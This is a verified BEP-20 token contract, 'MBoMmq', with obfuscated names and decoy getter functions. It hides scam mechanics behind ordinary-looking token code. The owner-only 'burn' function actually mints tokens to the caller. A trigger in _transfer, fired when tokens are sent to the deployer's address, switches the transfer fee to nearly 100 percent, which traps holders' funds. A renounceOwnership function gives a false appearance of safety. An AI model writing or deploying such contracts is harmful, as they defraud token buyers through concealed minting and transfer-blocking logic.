/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.7.2;
contract MBoMmq {
address private  rPHoJa = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
address private  LLjZlW = address(0);
uint256 private  nUfCKP = 1000000000000000000000;
uint256 private  eZGGgC = 10000000000000;
uint256 private  vrqDZR = 1000000000000000;
address private  SGCnfL = address(0);
uint256 private  eZjTgi = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
string public  name = "MBoMmq";
uint8 public constant decimals = 18;
uint256 private  uxSWxD = 10000000000;
address private  tTnpdm = address(0);
uint256 private  DHmWsv = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  onIIhU = address(0);
uint256 public constant ymnFJW = 99999;
uint256 private  lfoNIT = 100000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  KpvOnL = address(0);
address private  GiqepX = address(0);
string public  symbol = "MBoMmq";
event Transfer(address indexed from, address indexed to, uint256 value);
address private  WElrWP = address(0);
address private  HgyVOt = address(0);
function _getHgyVOt() private returns (address) {
return HgyVOt;
}



function _getKpvOnL() private returns (address) {
return KpvOnL;
}

function _getDHmWsv() private returns (uint256) {
return DHmWsv;
}







function _getLLjZlW() private returns (address) {
return LLjZlW;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _gettTnpdm() private returns (address) {
return tTnpdm;
}



constructor () {
WElrWP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}




function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tqmHUZC 0");
require(spender != address(0), "fqmHUZC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getGiqepX() private returns (address) {
return GiqepX;
}

function _getuxSWxD() private returns (uint256) {
return uxSWxD;
}

function _getvrqDZR() private returns (uint256) {
return vrqDZR;
}



function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "qmHUZC");
require(to != address(0), "qmHUZC");
require(amount <= balanceOf[from], "qmHUZC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ymnFJW/eZjTgi ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WElrWP){
eZjTgi = ymnFJW+2;
}
emit Transfer(from, to, transferAmount);
}




function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getrPHoJa() private returns (address) {
return rPHoJa;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _geteZGGgC() private returns (uint256) {
return eZGGgC;
}





function _getSGCnfL() private returns (address) {
return SGCnfL;
}

function _getlfoNIT() private returns (uint256) {
return lfoNIT;
}

function _getonIIhU() private returns (address) {
return onIIhU;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getnUfCKP() private returns (uint256) {
return nUfCKP;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}